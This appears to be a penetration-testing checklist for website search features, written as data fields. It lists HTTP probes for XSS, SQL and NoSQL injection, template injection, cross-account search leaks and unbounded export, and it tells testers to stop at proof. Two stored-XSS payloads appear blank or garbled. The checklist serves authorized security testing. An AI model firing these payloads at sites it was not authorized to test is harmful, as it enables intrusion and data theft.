title: Search / listing
summary: Reflected and stored XSS, SQL / NoSQL / SSTI in q=, authorization on results, and scrape limits.

groups.title: Cross-site scripting
groups.summary: q= lands in HTML, JS, or an attribute.

checks.title: Reflected XSS in search
checks.why: The query is echoed into the results page without encoding for that context.
checks.validate: A marker in q= executes in a realistic navigation (not a raw JSON dump).

variants.name: HTML context
variants.payload:
GET /search?q=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1
Host: www.example.com
Connection: close
variants.expect: If the raw markup appears in the HTML body, refine until it executes. Also try the same in POST.
variants.why: The search term reflected in HTML is the simplest reflected-XSS context.

variants.name: Attribute context
variants.payload:
GET /search?q=%22%20onmouseover%3Dalert(1)%20x%3D%22 HTTP/1.1
Host: www.example.com
Connection: close
variants.expect: If q= lands in value="…", a quote breakout executes.
variants.why: A quote breakout in an attribute reaches a scriptable context.

variants.name: JS string context
variants.payload:
GET /search?q=%27-alert(1)-%27 HTTP/1.1
Host: www.example.com
Connection: close
variants.expect: If the page does var q = '…', a quote plus a call executes. Confirm in the browser.
variants.why: An unescaped value in a JS string can escape into executable code.

variants.name: javascript: and data:
variants.payload:
GET /search?next=javascript:alert(1) HTTP/1.1
Host: www.example.com
Connection: close
variants.expect: Must not become a navigable href or Location. Repeat for q, query, s, term, filter.
variants.why: A javascript: or data: URL in a sink navigates to attacker code.

checks.title: Stored XSS via saved search / name
checks.why: A saved search name, filter, or alert is later rendered for another user or an admin.
checks.validate: A marker you stored executes in a realistic viewer context.

variants.name: Saved-search name
variants.payload: POST /searches HTTP/1.1 Host: www.example.com Cookie: session= Content-Type: application/json {"name":"","q":"widget"}
variants.expect: Open the saved list as B and in any admin view.
variants.why: A saved-search name rendered for other users is stored XSS.

variants.name: Highlight / snippet
variants.payload: Store a document whose body is then search for a word inside it.
variants.expect: Highlighter XSS is stored XSS. Confirm the snippet is encoded.
variants.why: The highlight/snippet renderer may re-parse the stored input into HTML.

groups.title: Interpreter injection
groups.summary: SQL, NoSQL, and template evaluation through the same q=.

checks.title: SQL injection in search
checks.why: q= is concatenated into a SQL string.
checks.validate: Paired payloads produce a consistent boolean or error differential. Do not dump tables.

variants.name: Error / syntax
variants.payload:
GET /search?q=%27 HTTP/1.1
Host: www.example.com
Connection: close
variants.expect: A SQL error, stack, or a different 500 vs the baseline is a lead. Follow with a boolean pair.
variants.why: A quote or syntax error in q= is the first differential for SQL injection.

variants.name: Boolean pair
variants.payload:
GET /search?q=widget%27+AND+1%3D1-- HTTP/1.1
Host: www.example.com
Connection: close
variants.expect: Compare with AND+1%3D2. Same pair as q=widget' AND '1'='1. A stable differential is the finding.
variants.why: Stable AND 1=1 / AND 1=2 differentials confirm injection without dumping data.

variants.name: ORDER BY / sort
variants.payload:
GET /search?q=widget&sort=id;select+1 HTTP/1.1
Host: www.example.com
Connection: close
variants.expect: sort, order, field, and column identifiers are a different injection point. Also try sort=1 / sort=99.
variants.why: Sort parameters flow into ORDER BY and can be injected.

checks.title: NoSQL operator injection
checks.why: JSON search filters accept $gt / $ne / $where the client never meant to send.
checks.validate: A filter returns objects the baseline query did not, without a matching keyword.

variants.name: Mongo operator in JSON
variants.payload:
POST /api/v1/search HTTP/1.1
Host: www.example.com
Content-Type: application/json
Authorization: Bearer <token>

{"q":{"$ne":null},"filter":{"status":{"$ne":""}}}
variants.expect: Must be rejected or treated as a literal string. Extra rows vs q="widget" is the finding.
variants.why: A $ operator in JSON search input turns an equality into an operator comparison.

variants.name: Bracket operators
variants.payload:
GET /search?q[$ne]=&status[$gt]= HTTP/1.1
Host: www.example.com
Connection: close
variants.expect: qs parsers turn this into operators. Same comparison against a normal q=.
variants.why: qs-style bracket operators convert ordinary fields into NoSQL operators.

checks.title: Server-side template injection
checks.why: q= is interpolated into a server template and evaluated.
checks.validate: A harmless arithmetic payload is evaluated (7*7 → 49). Do not escalate to a shell on a shared host.

variants.name: Twig / Jinja arithmetic
variants.payload:
GET /search?q={{7*7}} HTTP/1.1
Host: www.example.com
Connection: close
variants.expect: Look for 49 in the page where the query is echoed. Also try ${7*7} and <%= 7*7 %>.
variants.why: Template engines evaluate arithmetic first, so a small expression is a safe probe.

variants.name: Freemarker / Velocity
variants.payload:
GET /search?q=%24%7B7*7%7D HTTP/1.1
Host: www.example.com
Connection: close
variants.expect: Same 49 check. Blind SSTI uses a unique Collaborator callback, not a reverse shell.
variants.why: Different engines use different syntax; probing the stack's engine matters.

groups.title: Authorization and abuse
groups.summary: Search must not be an IDOR oracle, and scrape must be bounded.

checks.title: Authorization on search hits
checks.why: A search or export returns objects the caller cannot open directly.
checks.validate: A hit for B's private object appears in A's results or export.

variants.name: Search for B's unique marker
variants.payload:
GET /search?q=wapt-private-marker-B HTTP/1.1
Host: www.example.com
Cookie: session=<account-A>
variants.expect: A's session must not see B's private document. Also try the same query on /export.
variants.why: A hit for a marker only B's account holds proves cross-account data leakage via search.

variants.name: Filter by owner_id
variants.payload:
GET /api/v1/items?owner_id=1002 HTTP/1.1
Host: www.example.com
Authorization: Bearer <account-A-token>
variants.expect: A filter is not an authorization bypass. Empty or 403, not B's list.
variants.why: An owner filter parameter can be changed to read another user's results.

checks.title: Search / export scrape limits
checks.why: Unbounded pagination or export dumps the corpus.
checks.validate: A bounded burst is throttled or windowed. Do not dump the dataset.

variants.name: Page walk
variants.payload:
GET /search?q=a&page=1 HTTP/1.1
Host: www.example.com
Cookie: session=<account-A>
variants.expect: Walk a few pages only. page=99999, page_size=10000, and offset=-1 are the interesting variants.
variants.why: Walking pages tests pagination rate limits without a wide scrape.

variants.name: Export
variants.payload:
GET /search/export?q= HTTP/1.1
Host: www.example.com
Cookie: session=<account-A>
variants.expect: A full-corpus CSV without a limit is the finding. Stop after you see the size.
variants.why: Bulk export endpoints may bypass the per-page rate limit.

sqli-boolean.purpose: Stable AND 1=1 / AND 1=2 differentials confirm injection without dumping data.
sqli-boolean.payload:
GET /search?q=widget%27+AND+1%3D1-- HTTP/1.1
Host: www.example.com
Connection: close
